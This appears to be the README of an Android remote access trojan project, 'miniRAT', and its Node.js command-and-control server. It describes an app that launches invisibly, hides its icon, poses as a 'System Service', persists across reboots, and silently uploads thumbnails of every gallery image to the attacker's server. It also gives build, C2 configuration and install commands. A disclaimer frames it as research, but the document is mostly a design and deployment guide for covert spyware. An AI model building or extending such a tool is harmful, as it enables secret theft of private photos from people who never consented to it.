# miniRAT

> A minimal Android Remote Access Trojan (RAT) for educational and security research purposes. Demonstrates covert gallery thumbnail exfiltration to a remote C2 server.

---

## Overview

| Component | Technology | Description |
|---|---|---|
| **Android Client** | Java, Android SDK (API 21–36) | Stealth app that silently scans the device gallery and uploads thumbnail previews to a remote server on first launch. Hides from app drawer after use. |
| **C2 Server** | Node.js, Express.js | Receives uploaded thumbnails, stores on disk, and serves a web gallery dashboard. |

---

## Features

### Android Client
- **Zero-UI Launch** — Invisible activity requests storage permission, starts the service, hides from app drawer, and finishes instantly.
- **Runtime Permissions** — Requests `READ_MEDIA_IMAGES` (Android 13+) or `READ_EXTERNAL_STORAGE` (Android 6–12) at first launch.
- **App Drawer Hiding** — Disables its own launcher component after first run — app icon disappears permanently.
- **Foreground Service** — Runs as a foreground service on Android 8+ with a silent "System Service" notification.
- **One-Time Gallery Scan** — Queries MediaStore for **all image types** (JPEG, PNG, WEBP, GIF, HEIC, BMP, etc.) using ContentUris for scoped storage compatibility.
- **Memory-Efficient Thumbnailing** — Uses `inSampleSize` for downsampled decoding and `bitmap.recycle()` for cleanup.
- **Safe JSON Payloads** — Uses `org.json.JSONObject` to prevent JSON injection via filenames.
- **Boot Persistence** — `BootReceiver` auto-restarts the service on reboot using `startForegroundService()`.
- **START_STICKY** — System will attempt to restart the service if killed.

### C2 Server
- **Thumbnail Receiver** — Accepts Base64-encoded thumbnails via POST, decodes and saves as JPEG.
- **Metadata Tracking** — JSON metadata alongside each thumbnail with original filename and upload timestamp.
- **Gallery Dashboard** — Responsive HTML/CSS/JS gallery at root URL with 30-second auto-refresh.
- **Thumbnail Listing API** — Returns all stored thumbnails sorted newest first.
- **CORS Enabled** — Accepts requests from any origin.

---

## Project Structure

```
miniRAT/
├── app/
│   ├── build.gradle.kts              # Build config, dependencies, BuildConfig injection
│   ├── local.properties              # DOMAIN_URL for C2 server
│   └── src/main/
│       ├── AndroidManifest.xml       # Permissions, components, intent filters
│       └── java/com/app/minirat/
│           ├── HiddenActivity.java   # Stealth launcher → permission → service → hide → finish
│           ├── Service.java          # Core service — gallery scan + thumbnail upload
│           └── BootReceiver.java     # Persistence — restarts service on boot
├── server.js                         # Node.js C2 server (Express)
└── .claude/                          # Project documentation
    ├── README.md                     # This file
    ├── ARCHITECTURE.md               # System architecture
    ├── ANALYSIS.md                   # Remaining issues & recommendations
    └── CONTEXT.md                    # Developer guide & conventions
```

---

## How It Works

### Infection Flow

```
1. User installs APK (sideloaded)
2. User taps app icon in drawer
3. HiddenActivity launches (invisible)
   ├── Requests READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE permission
   ├── Starts Service (foreground on Android 8+)
   ├── Disables launcher component → app disappears from drawer
   └── finish() — activity gone
4. Service runs one-time gallery scan:
   ├── Queries MediaStore for ALL image types via ContentURIs
   ├── For each image:
   │   ├── Decodes with inSampleSize (memory-efficient)
   │   ├── Scales to 128×128 thumbnail
   │   ├── Encodes as Base64 JPEG
   │   └── POST to {DOMAIN_URL}/api/upload/thumbnail
   └── Scan complete — service stays alive
5. On device reboot:
   └── BootReceiver → startForegroundService() → re-scans gallery
```

---

## Permissions

| Permission | API Range | Usage |
|---|---|---|
| `INTERNET` | All | Upload thumbnails to C2 server |
| `ACCESS_NETWORK_STATE` | All | Check network connectivity |
| `READ_EXTERNAL_STORAGE` | 21–32 | Access gallery via MediaStore |
| `READ_MEDIA_IMAGES` | 33+ | Access gallery on Android 13+ |
| `RECEIVE_BOOT_COMPLETED` | All | Restart service after reboot |
| `FOREGROUND_SERVICE` | 26+ | Required for foreground service |

---

## Setup & Configuration

```bash
# 1. Clone
git clone https://github.com/Rhishavhere/miniRAT.git
cd miniRAT

# 2. Set C2 URL
echo "DOMAIN_URL=https://your-server.com" > app/local.properties

# 3. Start server
npm install express cors multer
node server.js

# 4. Build APK
./gradlew assembleDebug

# 5. Install
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## API Reference

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/api/upload/thumbnail` | Upload Base64 thumbnail `{ filename, thumbnail }` |
| `GET` | `/api/thumbnails` | List all thumbnails (newest first) |
| `GET` | `/api/fullsize/:filename` | Serve full-size file |
| `GET` | `/` | Gallery dashboard |

---

## Disclaimer

> **⚠️ Educational and authorized security research only.**
>
> Unauthorized access to computer systems and data exfiltration is illegal. Only install on devices you own or have explicit authorization to test.
